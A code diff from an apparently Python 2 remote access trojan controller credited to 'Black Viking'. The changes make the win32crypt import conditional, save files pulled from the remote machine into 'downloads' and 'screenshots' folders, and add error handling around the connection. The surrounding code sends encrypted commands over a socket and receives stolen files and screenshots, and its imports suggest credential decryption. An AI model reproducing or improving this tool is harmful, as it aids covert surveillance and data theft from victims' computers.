@@ -4,7 +4,7 @@
 #
 
 __author__ = "Black Viking"
-__date__ = "13.04.2017"
+__date__   = "15.04.2017"
 
 END_OF_FILE = "(((END_OF_FILE)))"
 
@@ -13,10 +13,11 @@ import os
 import sys
 import base64
 import sqlite3
-import win32crypt
 from colorama import init
 from colorama import Fore, Back, Style
 from time import *
+
+if os.name == "nt": import win32crypt
 
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -82,9 +83,9 @@ def download(command):
     cli.sendall(crypt(command))
     
     if "screenshot()" in command: 
-        fileName = str(command.replace("screenshot() ", "").replace("download ", ""))
+        fileName =  "screenshots" + os.sep + str(command.replace("screenshot() ", "").replace("download ", ""))
     else:
-        fileName = str(command.replace("download ", ""))
+        fileName = "downloads" + os.sep + str(command.replace("download ", ""))
 
     while True:
         l = cli.recv(1024)
@@ -209,4 +210,8 @@ if __name__ == "__main__":
     init(autoreset=True)
     host = sys.argv[1]
     port = int(sys.argv[2])
-    start(host, port)
+    try:
+        start(host, port)
+    except Exception as e:
+        print "[!] Error: %s"%(e)
+    raw_input("\n[~] Press enter to exit...")
